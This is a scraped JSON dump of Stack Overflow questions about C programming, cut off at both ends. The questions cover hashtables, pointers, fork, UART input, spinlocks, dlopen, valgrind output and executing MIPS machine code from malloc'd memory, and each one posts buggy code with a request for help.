printf(\"\\n\");\n}\n}\n\n\n #ifndef CHECKERS_H\n #define CHECKERS_H\n\n #define Empty 0\n #define Piece 1\n #define King 2\n\n #define HUMAN 1\n #define COMPUTER 2\n\n struct Square {\n         Widget widget;\n         int val;\n         int state;\n         int col;\n         int hilite;\n };\n\n void PrintBoard();\n #endif\n</code></pre>\n\n<p>I attempted to just call state->PrintBoard() but the program couldn't recognize the call. I also tried adding a Square struct to the State struct in the computer header file but that also created an error. I also created a new PrintBoard method in the computer.c file but it wouldn't know which color state was in each square.  Any help would be appreciated and I can post more code that I have if needed.</p>\n"},{"tags":["c","stackoverflow"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":112,"score":2,"question_id":5919499,"title":"C- Possible stack overflow from a function","body":"<p>I'm writing a HashTable program where the HashTable is full of LinkedLists which counts the word frequencies of a file. In the final implementation of the program, the user is allowed to choose what the chain size of the linked list via a command line argument with any other command line arguments assumed to be files that need to be processed.</p>\n\n<p>Right now I am getting a stack over flow problem from my search function to determine whether the word is already in the table or not and I'm not sure how to fix it. I valgrind the program it said it was a possible over flow</p>\n\n<p>Before I add another node to the hashtable I call a method that returns 1 if the word is found and 0 if it is not found. Here is the call:</p>\n\n<pre><code> inFile = searchFile(table, data);\n</code></pre>\n\n<p>table is the HashTable and data is the word</p>\n\n<p><b> searchFile which calls search which is part of my List class </b> <br></p>\n\n<pre><code> int searchFile(HashTablePtr table, char *data) {\n     ListPtr tempList;\n     HashObjectPtr obj;\n     int i;\n\n     for (i = 0; i &lt; table-&gt;size; i++) {\n         tempList = table-&gt;table[i];\n         if (tempList-&gt;size &gt; 0) {\n             obj = search(table-&gt;table[i], data);\n            if (obj != NULL) {\n                obj-&gt;frequency++;\n                return 1;\n            }\n        }\n\n    }\n    return 0;\n}\n</code></pre>\n\n<p><b> List search function </b> <br><br></p>\n\n<pre><code> HashObjectPtr search(ListPtr list, char *data) {\n     int num = list-&gt;size;\n     int i;\n\n     NodePtr tempNode;\n     HashObjectPtr tempObj;\n\n     tempNode = list-&gt;head;\n\n     for (i = 0; i &lt; num; i++) {\n         tempObj = tempNode-&gt;HashObject;\n         while (tempNode != NULL) {\n             if (strcmp((char *) tempObj-&gt;obj, data) == 0) {\n                return tempObj;\n             } else {\n                tempNode = tempNode-&gt;next;\n             }\n         }\n     }\n\n    return NULL;\n}\n</code></pre>\n\n<p><br>\nI've used the HashObjectPtr search function before in a previous implementation of this program without any problems and I'm not sure why it would be creating an overflow now.</p>\n\n<p><b>HashObject</b><br></p>\n\n<pre><code> struct hashobject {\n     int frequency;\n     void *obj;\n\n     char (*toString)(void *obj);\n };\n</code></pre>\n\n<p><b>HashTable</b> <br></p>\n\n<pre><code> struct hashtable {\n      int size;\n      ListPtr *table;\n };\n</code></pre>\n\n<p><b> Lise </b> <br></p>\n\n<pre><code> struct list {\n     int size;\n     NodePtr head;\n     NodePtr tail;\n };\n</code></pre>\n\n<p>I'm not entirely sure that it is a stack overflow as all valgrind really shows is that a few words have gone in and then I get a segmentation fault error. I have ran it through the debugger but it fails at my search function after going through about 12 iterations of the for loop.</p>\n"},{"tags":["c"],"answer_count":6,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":117,"score":5,"question_id":13176491,"title":"What is the most appropriate way to assign and test a variable in an if statement?","body":"<p>Of the following, which is the preferred way of doing things, and why? Are there any specific situations in which it makes any difference, <strong>assuming that the function bar() does not take the value zero at any time</strong>?</p>\n\n<p>Case 1: Test the truth value of both conditions</p>\n\n<pre><code>if ((foo = bar()) &amp;&amp; foo &lt; 0)\n    error();\n</code></pre>\n\n<p>Case 2: Test only the assigned variable</p>\n\n<pre><code>if ((foo = bar()) &lt; 0)\n    error();\n</code></pre>\n"},{"tags":["c","int","double","sqrt"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":100,"score":1,"question_id":13178618,"title":"sqrt taking int in c","body":"<p>I am programming in the c language on mac os x. I am using sqrt, from math.h, function like this:</p>\n\n<pre><code>int start = Data -&gt; start_number;\ndouble localSum;\n\nfor (start; start &lt;= end; start++) {\n    localSum += sqrt(start);\n}\n</code></pre>\n\n<p>This works, but why? and why am I getting no warning? On the man page for sqrt, it takes a double as parameter, but I give it an int - how can it work?</p>\n\n<p>Thanks</p>\n"},{"tags":["c","graph-theory","shortest-path","bellman-ford"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":34,"score":-1,"question_id":13186296,"title":"Running Bellman Ford After Each Edge Is Input","body":"<p>I am experimenting with the Bellman Ford Algorithm, and am trying to run it as I input edges.</p>\n\n<p>So basically, pseudo code would look like this:</p>\n\n<pre><code>While(input edges exist){\ninput edge\nbellman-ford}\n</code></pre>\n\n<p>By doing it this way, I want to count the number of edges that actually end up having a \"relaxing\" effect on the graph, and yes I'm aware if I were to read in the graph in a different order there may be a different number of edges like this.</p>\n\n<p>Here is some sample data in the form of (v1, v2, weight):</p>\n\n<pre><code>4 5 1\n2 3 1\n4 3 2\n2 5 2\n3 6 1\n1 2 2\n1 4 1\n5 6 1\n</code></pre>\n\n<p>And the number of edges that helped relax the graph would be 3 in this case.</p>\n\n<p>Here is the code I'm working with currently, I just don't see where I'm going wrong exactly, BUT I am also very willing to hear other ideas on how to do this!</p>\n\n<pre><code>       #include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct\n{\n        int u;\n        int v;\n        int w;\n        struct Edge * nextEdge;\n}Edge;\n\nint getNextEdge(FILE * fp);\nvoid bellford(int e, int n, Edge * edgeArray);\nint numberRelaxedBellFord =0;\nint distance[32];\n\nint main(int argc, char *argv[])\n{\n\n        if(argc != 2)                                                           //insure 2 arguments given, one for a.out and one for the test file\n        {\n                printf(\"Requires 2 arguments. Be sure to include test file location\\n\");        //result if request fails\n                return 0;\n        }\n\n        FILE *fp;\n        fp = fopen(argv[1], \"r\");\n\n        int numberVertices = 0;\n        int numberEdges = 0;\n        int u, v, w;\n        fscanf(fp, \"%d\", &amp;numberVertices);\n        while(fscanf(fp, \"%d %d %d\", &amp;u, &amp;v, &amp;w) != EOF)\n        {\n                numberEdges++;\n        }\n\n\n printf(\"Number of edges is: %d\\n\", numberEdges);\n\n        Edge edgeArray[numberEdges];\n        fclose(fp);\n        int existNodes[numberVertices];\n        int i = 0;\n\n        for(i=0;i&lt;numberVertices;i++)\n        {\n                existNodes[i] = 0;\n        }\n\n\n        fp = fopen(argv[1], \"r\");\n        fscanf(fp, \"%d\", &amp;numberVertices);\n        int countNode = 0;\n        int e = 0;\n        int breakLoop = 0;\n        while(fscanf(fp, \"%d %d %d\", &amp;u, &amp;v, &amp;w) != EOF)\n        {\n                edgeArray[e].u = u;\n                if(existNodes[u-1] != 5)\n                {\n                        countNode++;\n                        existNodes[u-1] = 5;\n                }\n                edgeArray[e].v = v;\n                if(existNodes[v-1] != 5)\n                {\n                        countNode++;\n                        existNodes[u-1] = 5;\n                }\n                edgeArray[e].w = w;\n                e++;\n\n                bellford(e, countNode, edgeArray);\n        }\n        printf(\"The number relaxed was: %d\", numberRelaxedBellFord);\n}\n\n\nvoid bellford(int e, int n, Edge * edgeArray)\n{\n        int i, j;\n\n        for(i=0;i&lt;n;i++)\n        {\n                distance[i] = 9999;\n        }\n        distance[0] = 0;\n\n        for(i=0; i&lt;n; i++)\n        {\n                for(j=0;j&lt;e;j++)\n                {\n                        if(distance[edgeArray[j].u] + edgeArray[j].w &lt; distance[edgeArray[j].v])\n                        {\n                                distance[edgeArray[j].v] = distance[edgeArray[j].u] + edgeArray[j].w;\n                                numberRelaxedBellFord++;\n                        }\n                }\n        }\n}\n</code></pre>\n"},{"tags":["c"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":131,"score":1,"question_id":13186086,"title":"Logical Error in my C Code","body":"<p>I am a beginner, just learning C; so, please be patient with me. </p>\n\n<p>I am trying to write a very simple program that goes through a string, counts the characters in each word, and then replaces those words with the number of their characters. My problem is that I am stuck in an infinite loop and cannot figure out why! Here is the code:</p>\n\n<pre><code>#define NEWLINE '\\n'\n#define SPACE ' '\n\nint main(int argc, char *argv[]) {\n  int character;\n  int count = 0;\n\n  printf(\"\\nType in a sentence of any lenght, then hit ENTER!\\n\");\n  character = getchar();\n\n  while (character != NEWLINE) {\n\n     while ((character != SPACE)  || (character != NEWLINE)) {\n        count++;\n        character = getchar();\n     }\n\n  printf(\"%d \", count); \n  count = 0;\n\n  if (character != NEWLINE) {\n     character = getchar();\n     }\n  }  \n\n printf(\"\\n\");\n system(\"PAUSE\"); \n return 0;\n }\n</code></pre>\n\n<p>Thanks for everyone who helped me! I guess I go back and study logical operators a bit more.</p>\n"},{"tags":["c","pointers"],"answer_count":6,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":148,"score":1,"question_id":8436254,"title":"When using calloc in C what is stored at the address of the pointer?","body":"<p>I'm having a hard time understanding this program to illustrate pointers (from <a href=\"http://theocacao.com/document.page/234\" rel=\"nofollow\">http://theocacao.com/document.page/234</a>):</p>\n\n<p>Below I don't understand why:</p>\n\n<pre><code>int * currentSlot = memoryBlock\n</code></pre>\n\n<p>isn't using <code>&amp;memoryBlock</code>.  I read the comment but don't get it.  What is memoryBlock putting in there that &amp;memoryBlock wouldn't?  Won't both return the pointer to the set of ints created with calloc (assuming I understand what's been done that is)?  What is really in <code>* memoryBlock</code> after <code>calloc</code>?</p>\n\n<p>Then here, <code>*currentSlot = rand();</code>, how does the dereferencing work here?  I thought the dereference would stop *currentSlot from giving the value of the memory address (the reference) to the actual value (no longer a reference but the value).</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt; // for calloc and free\n#include &lt;time.h&gt;   // for random seeding\n\nmain ()\n{\n  const int count = 10; \n  int * memoryBlock = calloc ( count, sizeof(int) );\n\n  if ( memoryBlock == NULL )\n  {\n    // we can't assume the memoryBlock pointer is valid.\n    // if it's NULL, something's wrong and we just exit\n    return 1;\n  }\n\n  // currentSlot will hold the current \"slot\" in the,\n  // array allowing us to move forward without losing\n  // track of the beginning. Yes, C arrays are primitive\n  //\n  // Note we don't have to do '&amp;memoryBlock' because\n  // we don't want a pointer to a pointer. All we\n  // want is a _copy_ of the same memory address\n\n  int * currentSlot = memoryBlock;\n\n\n  // seed random number so we can generate values\n  srand(time(NULL));\n\n  int i;    \n  for ( i = 0; i &lt; count; i++ )\n  {\n    // use the star to set the value at the slot,\n    // then advance the pointer to the next slot    \n    *currentSlot = rand();\n    currentSlot++; \n  }\n\n  // reset the pointer back to the beginning of the\n  // memory block (slot 0)\n  currentSlot = memoryBlock;\n\n  for ( i = 0; i &lt; count; i++ )\n  {\n    // use the star to get the value at this slot,\n    // then advance the pointer\n    printf(\"Value at slot %i: %i\\n\", i, *currentSlot);\n    currentSlot++;\n  }\n\n  // we're all done with this memory block so we\n  // can free it  \n  free( memoryBlock );\n}\n</code></pre>\n\n<p>Thank you for any help.</p>\n"},{"tags":["c","operating-system","fork"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":49,"score":-1,"question_id":13185917,"title":"address space after fork call","body":"<p>When fork() sys call is executed by the process, a child process generated from it. All the codes following the fork() call is copied to the new physical pages of memory i.e frames. I am not able to visualize the virtual memory part of the child process.because in the following code the address of char variable is same in child as well as parent.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n\nint main(void)\n{\n    pid_t pid;\n    char y='Y';\n    char *ptr;\n    ptr=&amp;y;\n    pid = fork();\n    if (pid == 0)\n    {\n        y='Z';\n        printf(\" *** Child process ***\\n\");\n        printf(\" Address is %p\\n\",ptr);\n        printf(\" char value is %c\\n\",y);\n        sleep(5);\n    }\n    else\n    {\n        sleep(5);\n        printf(\"\\n ***parent process ***\\n\",&amp;y);\n        printf(\" Address is %p\\n\",ptr);\n        printf(\" char value is %c\\n\",y);\n    }\n}\n</code></pre>\n\n<p>and its output:</p>\n\n<pre><code>*** Child process ***\nAddress is 69002894\nchar value is Z\n\n***parent process ***\nAddress is 69002894\nchar value is Y\n</code></pre>\n"},{"tags":["c","atmega"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":57,"score":3,"question_id":13185250,"title":"How to convert 8Bit to decimal bar from 0 to 15?","body":"<p>Okay, here's what I'm trying to program in C.</p>\n\n<p>I have an 8bit binary signal from an ADC on an ATmega32. </p>\n\n<p>Now I want to convert that signal into an bar with 15LED's that increases the higher the input value is. \nSo basically I want to cut my 8bit signal down to a 4bit one, convert it to decimal and show it at an increasing bar. </p>\n\n<p>I first had the idea to check if my input is in a specific range (which would be always a range of 255/15) but I just couldn't figure out how.</p>\n\n<p>Just checking if the input is higher than a particular value won't work because in that way there could be more than one condition at a time true. </p>\n\n<p>Have you any idea how I could solve that? Any help is highly appreciated. ;)\nThank you!</p>\n"},{"tags":["c","static","constants"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":13185751,"title":"What is the difference between static const and const?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/6381088/const-vs-static-const\">Const vs Static Const</a>  </p>\n</blockquote>\n\n\n\n<p>What is the difference between <code>static const</code> and <code>const</code>?\nFor example:</p>\n\n<pre><code>static const int a=5;\nconst int i=5;\n</code></pre>\n\n<p>Is there any difference between them?\nWhen would you use one over the other?</p>\n"},{"tags":["c","pointers"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":179,"score":0,"question_id":2678525,"title":"Pointers and getstring function","body":"<p>I am trying to write a function to get a string from uart. Its for an embedded system so I don't want to use malloc.</p>\n\n<p>The pointer that is passed to the getstring function seems to point to garbage after the gets_e_uart1() is called. I don't use pointers too often so I'm sure it is something really stupid and trivial that Im doing wrong.</p>\n\n<pre><code>int main()\n    {   \n        char *ptr  = 0;\n        while(1)\n        {\n\n        gets_e_uart1(ptr, 100);\n        puts_uart1(ptr);\n\n    }\n        return 0;\n}*end main*/ \n\n//-------------------------------------------------------------------------\n//gets a string and echos it\n//returns 0 if there is no error\n\nchar getstring_e_uart1(char *stringPtr_, const int SIZE_)\n\n{\n\nchar buffer_[SIZE_];\nstringPtr_ = buffer_;\nint start_ = 0, end_ = SIZE_ - 1;\nchar errorflag = 0;\n\n/*keep geting chars until newline char recieved*/\nwhile((buffer_[start_++] = getchar_uart1())!= 0x0D)\n{       \n    putchar_uart1(buffer_[start_]);//echo it\n\n    /*check for end of buffer \n     wraparound if neccesary*/\n    if(start_ == end_)\n    {\n        start_ = 0;\n        errorflag = 1;\n    }\n}\nputchar_uart1('\\n');\nputchar_uart1('\\r');\n\n/*check for end of buffer \n wraparound if neccesary*/\nif(start_ == end_)\n{\n    buffer_[0] = '\\0';\n    errorflag = 1;\n}\nelse\n{\n    buffer_[start_++] = '\\0';\n}\nreturn errorflag;\n}\n</code></pre>\n\n<p><strong>Update:</strong></p>\n\n<p>I decided to go with approach of passing a pointer an array to the function. This works nicely, thanks to everyone for the informative answers.</p>\n\n<p><strong>Updated Code:</strong></p>\n\n<pre><code> //-------------------------------------------------------------------------\n //argument 1 should be a pointer to an array, \n //and the second argument should be the size of the array\n //gets a string and echos it\n //returns 0 if there is no error\nchar getstring_e_uart1(char *stringPtr_, const int SIZE_)\n{\n\n    char *startPtr_ = stringPtr_;\n    char *endPtr_  = startPtr_ + (SIZE_ - 1);\n    char errorflag = 0;\n\n    /*keep geting chars until newline char recieved*/\n    while((*stringPtr_ = getchar_uart1())!= 0x0D)\n    {       \n        putchar_uart1(*stringPtr_);//echo it\n        stringPtr_++;\n\n        /*check for end of buffer \n         wraparound if neccesary*/\n        if(stringPtr_ == endPtr_)\n        {\n            stringPtr_ = startPtr_;\n            errorflag = 1;\n        }\n    }\n    putchar_uart1('\\n');\n    putchar_uart1('\\r');\n\n    /*check for end of buffer \n     wraparound if neccesary*/\n    if(stringPtr_ == endPtr_)\n    {\n        stringPtr_ = startPtr_;\n        *stringPtr_ = '\\0';\n        errorflag = 1;\n    }\n    else\n    {\n        *stringPtr_ = '\\0';\n    }\n    return errorflag;\n}\n</code></pre>\n"},{"tags":["c","linux"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":13185134,"title":"How to kill process completely from a thread in Linux (C)","body":"<p>I have a C code that runs on Linux that creates a certain amount of threads. In one of the threads, I want it so that if it runs into a certain condition, it should terminate the entire process. I looked up the exit() command but didn't really understand how to use it.</p>\n"},{"tags":["c","inline-assembly","spinlock"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":107,"score":2,"question_id":11923151,"title":"Is there any simple way to improve performance of this spinlock function?","body":"<p>I'm trying to implement a spinlock in my code but the spinlock that I implemented based on Wikipedia results in extremely slow performance.</p>\n\n<pre><code>int lockValue = 0;\n\nvoid lock() {\n    __asm__(\"loop: \\n\\t\"\n            \"movl $1, %eax \\n\\t\"\n            \"xchg %eax, lockValue \\n\\t\"\n            \"test %eax, %eax \\n\\t\"\n            \"jnz loop\");\n}\n</code></pre>\n\n<p>Is there any way of improving this to make it faster?</p>\n\n<p>Thanks.</p>\n"},{"tags":["c","linux","kernel","battery","acpi"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":42,"score":2,"question_id":13185081,"title":"Is there a way to get battery info (status, plugged in, etc) without reading a proc/sys file on linux?","body":"<p>I want to get information about the battery in C on linux. I <em>don't</em> want to read or parse <em>any</em> file! Is there any low-level interface to acpi/the kernel or any other module to get the information I want to have?</p>\n\n<p>I already searched the web, but every question results in the answer \"parse /proc/foo/bar\". I really don't want to do this because I think, low-level interfaces won't change as fast as Files do. </p>\n\n<p>best regards.</p>\n"},{"tags":["c","linux","sockets","devices"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":24,"score":-1,"question_id":13183286,"title":"Clients/IP and Device Monitor","body":"<p>Say I want to have a server that can accept socket connection and also can monitor devices which are plugged in the server.</p>\n\n<p>There will be two things the server can do.</p>\n\n<p><strong>1. Accept/Monitor Client connections via TCP/IP(recv and send from them);</strong></p>\n\n<p><strong>2. Monitor Devices(recv and send from the devices);</strong></p>\n\n<p>From number 1 i plan to use linux sockets to accept client connections.</p>\n\n<p>From number 2 i plan to use libudev.h library to monitor devices. which have a tutorial on signal11..</p>\n\n<p>I have already code linux sockets and libudev.h.. but they're separate user space app. I need to merge them as one.. How am i supposed to do this?.</p>\n\n<p>Or any suggestions how can i do this? THanks.</p>\n"},{"tags":["c","pthreads","signals"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":13184914,"title":"Using a String array in a thread function","body":"<p>I'm trying to pass an array to thread function so that it has access to the array in the function. For the moment it just contains the name of the threads.</p>\n\n<pre><code>const char *a[2];\nchar *s = \"Thread 1\";\nchar *r = \"Thread 2\";\na[0] = s;\na[1] = r;\npthread_create(&amp;t, NULL, oddhandler, (void *)a[0]);\npthread_create(&amp;y, NULL, evenhandler, (void *)a[1]);\n</code></pre>\n\n<p>The intention is to write the create like this</p>\n\n<pre><code>pthread_create(&amp;t, NULL, oddhandler, &amp;a);\npthread_create(&amp;y, NULL, evenhandler, &amp;a);\n</code></pre>\n\n<p>How would I re-write this function to accommodate this change?</p>\n\n<pre><code>static void *\noddhandler(void *p)\n{\n    char *q = (char *)p;\n    printf(\"%s is ready.\\n\", q);\n    sigset_t set;\n    int sig = SIGUSR1;\n\n    sigemptyset(&amp;set);\n\n    sigaddset(&amp;set, SIGUSR1);\n\n    while (1) {\n\n       /* Wait for SIGUSR1 */\n       sigwait(&amp;set, &amp;sig);\n\n       printf(\"%s received a SIGUSR1!\\n\", q);\n\n    }\n\n    return ((void *)NULL);\n}\n</code></pre>\n"},{"tags":["c","debugging","valgrind","ubuntu-10.04"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":13183491,"title":"Output of Valgrind missing essential values","body":"<p>I am beginning to learn C from <a href=\"http://c.learncodethehardway.org/book/\" rel=\"nofollow\">here</a>. I was learning to use valgrind in Chapter-5, Exercise-4. The problem is explained in source-code window-17 on <a href=\"http://c.learncodethehardway.org/book/learn-c-the-hard-waych5.html#x10-290005\" rel=\"nofollow\">this</a> page. </p>\n\n<p>Upon Valgrind'ing the  file (ex4.c), my output lacks from the Valgrind output shown on <a href=\"http://c.learncodethehardway.org/book/learn-c-the-hard-waych5.html#x10-290005\" rel=\"nofollow\">this</a> page in the following ways;</p>\n\n<ol>\n<li><p><code>???</code> instead of <code>_itoa_word (_itoa.c:195)</code></p></li>\n<li><p>Location of line numbers in C library files are not identified. Instead, the path to the shared library file (.so) is given.</p></li>\n</ol>\n\n<h2>An example giving a comparison of the two outputs is shown below.</h2>\n\n<p>WHAT I EXPECT</p>\n\n<p>==3082== Use of uninitialised value of size 8</p>\n\n<p>==3082==    at 0x4E730EB: _itoa_word (_itoa.c:195)</p>\n\n<p>==3082==    by 0x4E743D8: vfprintf (vfprintf.c:1613)</p>\n\n<p>==3082==    by 0x4E7E6F9: printf (printf.c:35)</p>\n\n<h2>==3082==    by 0x40052B: main (ex4.c:11)</h2>\n\n<hr>\n\n<p>WHAT I GET</p>\n\n<p>==14647==    at 0x407D256: ??? (in /lib/tls/i686/cmov/libc-2.11.1.so)</p>\n\n<p>==14647==    by 0x4080B89: vfprintf (in /lib/tls/i686/cmov/libc-2.11.1.so)</p>\n\n<p>==14647==    by 0x40882BF: printf (in /lib/tls/i686/cmov/libc-2.11.1.so)</p>\n\n<h2>==14647==    by 0x8048401: main (ex4.c:9)</h2>\n\n<p>Please tell me how can I correct my valgrind output. I am using Ubuntu-10.10, 32 bit version. I installed Valgrind-3.8.1 using source. My gcc version is 4.3.3 and glibc version 2.11.1</p>\n"},{"tags":["objective-c","c","ios","core-foundation","bitarray"],"answer_count":5,"favorite_count":3,"up_vote_count":8,"down_vote_count":0,"view_count":3559,"score":8,"question_id":3744304,"title":"How do I implement a bit array in C / Objective C","body":"<p>iOS /  Objective-C: I have a large array of boolean values.   </p>\n\n<p>This is an inefficient way to store these values – at least eight bits are used for each element when only one is needed.</p>\n\n<p>How can I optimise?</p>\n"},{"tags":["c++","c","linux","dlopen","so"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":96,"score":1,"question_id":12975673,"title":"dlopen - Undefined symbol error","body":"<p>I'm using dlopen to load a shared library at run time</p>\n\n<pre><code>dlopen(\"SharedLibarary1.so\", RTLD_NOW | RTLD_GLOBAL);\n</code></pre>\n\n<p>In that shared object I refer to a const char* defined in another shared library \"SharedLibarary2.so\". </p>\n\n<p>The Executable, and both the libraries are built using -rdynamic.</p>\n\n<p>But I still get the run time error when using dlopen: \"/usr/lib/SharedLibarary1.so: undefined symbol\" and points to the mangled const char* has the undefined symbol.</p>\n\n<p>Whith GDB \"info share\" I can see that the second library is not loaded at the point of the error. </p>\n\n<p>How ever that problem goes away if I do a dlopen on the second library before I do on the first library.</p>\n\n<p>Is there a better way to force the loader to load the second library for the unresolved symbol?</p>\n"},{"tags":["c","infinite-loop","scanf","issues"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":13184588,"title":"C infinite loop issue when prompting","body":"<p>Why in this code its doing an infinite loop without prompting again the user</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;ctype.h&gt;\n\nvoid to_rot13(char* value);\n\nint main(){\n    char word[1024];\n    printf(\"C ROT13\\nSome data to code or decode\\n\");\n    while (1){\n        printf(\": \");\n        scanf(\"%[^\\n]s\", word);\n        to_rot13(&amp;word);\n        printf(\": %s\\n\", word);\n    }\n    return 0;\n}\n\n\nvoid to_rot13(char* value){\n    unsigned int x;\n    for (x = 0; value[x] != '\\0'; x++){\n        if ((value[x] &lt; 'A') || (value[x] &gt; 'Z' &amp;&amp; value[x] &lt; 'a') || (value[x] &gt; 'z')){}\n        else if (tolower(value[x]) &lt;= 'm'){value[x] = value[x] + 13;}\n        else{value[x] = value[x] - 13;}\n    }\n}\n</code></pre>\n\n<p>I would like to prompt again the user\nI can't be more precice.</p>\n"},{"tags":["c","makefile","make","sdl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":13170806,"title":"libiconv issue when compiling SDL 2.0 on Mac OS X 10.6","body":"<p>I'm trying to compile SDL 2.0 on OS X 10.6, but I've been getting this message: </p>\n\n<pre><code>Undefined symbols:\n  \"_libiconv_open\", referenced from:\n      _SDL_iconv_string in SDL_iconv.o\n      _SDL_iconv_string in SDL_iconv.o\n  \"_libiconv\", referenced from:\n      _SDL_iconv in SDL_iconv.o\n      _SDL_iconv_string in SDL_iconv.o\n  \"_libiconv_close\", referenced from:\n      _SDL_iconv_string in SDL_iconv.o\n      _SDL_iconv_string in SDL_iconv.o\nld: symbol(s) not found\ncollect2: ld returned 1 exit status\n</code></pre>\n\n<p>I've read the issues over at <a href=\"https://github.com/mxcl/homebrew/issues/894\" rel=\"nofollow\">https://github.com/mxcl/homebrew/issues/894</a> and <a href=\"http://stackoverflow.com/questions/8104889/how-to-replace-macports-libiconv-with-macs-default-64-bit-version\">How to replace MacPort&#39;s libiconv with Mac&#39;s default 64-bit version?</a> to see if either of them help. I uninstalled everything that MacPorts had since those two seemed to suggest that the issue was related to multiple versions of the same library (libiconv it had installed had way too many dependencies to manually uninstall them all, and I didn't need them anymore), but am still getting the same error. Any ideas?</p>\n"},{"tags":["python","c","python-c-api"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":39,"score":1,"question_id":13182549,"title":"Python-C API: Trouble packing C strings into a tuple","body":"<p>In the following code, I am trying to pack two null-terminated C strings (char pointers) into a Python tuple.</p>\n\n<pre><code>printf(\"word1 = '%s', word2 = '%s'\\n\", words1-&gt;wordArray[i], words2-&gt;wordArray[i]);\ncmpArgs = Py_BuildValue(\"ss\", words1-&gt;wordArray[i], words2-&gt;wordArray[i]);\nprintf(\"%s\\n\", PyString_AsString(PyTuple_GetItem(cmpArgs, 0)));\n</code></pre>\n\n<p>This produces output like:</p>\n\n<pre><code>word1 = '20', word2 = '20'\ni┴\n</code></pre>\n\n<p>Why is the string different in the tuple than outside it? What am I doing wrong? Also, do I need to worry about incrementing and decrementing the reference count of this tuple? (I am creating it to pass to a Python function passed to C as a PyObject*)</p>\n"},{"tags":["c","assembly","mips","inline-assembly","mips32"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":94,"score":2,"question_id":13162464,"title":"Writing MIPS machine instructions and executing them from C","body":"<p>I'm trying to write some self modifying code in C and MIPS.</p>\n\n<p>Since I want to modify the code later on, I'm trying to write actual machine instructions (as opposed to inline assembly) and am trying to execute those instructions. Someone told me that it would be possible to <strong>just malloc some memory, write the instructions there, point a C function pointer to it and then jump to it.</strong> (I include the example below)</p>\n\n<p>I've tried this with my cross compiler (sourcery codebench toolchain) and it doesn't work (yes, in hind sight I suppose it does seem rather naive). How could I properly do this?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdint.h&gt;\n\n\nvoid inc(){\n    int i = 41;\n    uint32_t *addone = malloc(sizeof(*addone) * 2); //we malloc space for our asm function\n    *(addone) = 0x20820001; // this is addi $v0 $a0 1, which adds one to our arg (gcc calling con)\n    *(addone + 1) = 0x23e00000; //this is jr $ra\n\n    int (*f)(int x) = addone; //our function pointer\n    i = (*f)(i);\n    printf(\"%d\",i);    \n}\n\nint main(){\n    inc();\nexit(0);}\n</code></pre>\n\n<p>I follow the gcc calling convention here, where the arguments are passed to $a0 and the results of the functions are expected to be in $v0. I don't actually know if the return address will be put into $ra (but I can't test it yet since I can't compile.\nI use int for my instructions because I'm compiling MIPS32(hence a 32 bit int should be enough)</p>\n"},{"tags":["c","algorithm","hash"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":98,"score":2,"question_id":13183384,"title":"About hash functions","body":"<p>Let's consider a bidimensionnal array, declared as follow:</p>\n\n<pre><code>#include &lt;stdbool.h&gt;\n\nbool array[N1][N2];\n</code></pre>\n\n<p>I have to know whether each line of this array have exactly one <code>true</code> value at the same position.</p>\n\n<p>For example the following is ok:</p>\n\n<pre><code>{ \n  { 1, 0, 1, 0 },\n  { 1, 0, 0, 1 },\n  { 0, 0, 1, 1 }\n}\n</code></pre>\n\n<p>Whereas this is incorrect:</p>\n\n<pre><code>{ \n  { 1, 0, 1, 0 },\n  { 1, 0, 1, 0 },\n  { 0, 0, 1, 1 }\n}\n</code></pre>\n\n<p>I've tried this:</p>\n\n<pre><code>static uintmax_t hash(const bool *t, size_t n) \n{\n    uintmax_t retv = 0U;\n    for (size_t i = 0; i &lt; n; ++i)\n        if (t[i] == true)\n            retv |= 1 &lt;&lt; i;\n    return retv;\n}\n\nstatic int is_valid(bool n) \n{ \n    return n != 0 &amp;&amp; (n &amp; (n - 1)) == 0;\n}\n\nbool check(bool t[N1][N2])\n{\n    uintmax_t thash[N1];\n\n    for (size_t i = 0; i &lt; N1; ++i)\n        thash[i] = hash(t[i], N2);\n\n    for (size_t i = 0; i &lt; N1; ++i)\n        for (size_t j = 0; j &lt; N1; ++j)\n            if (i != j &amp;&amp; !is_valid(thash[i] &amp; thash[j]))\n                return 0;\n\n    return 1;\n}\n</code></pre>\n\n<p>But it works only with <code>N1 &lt;= 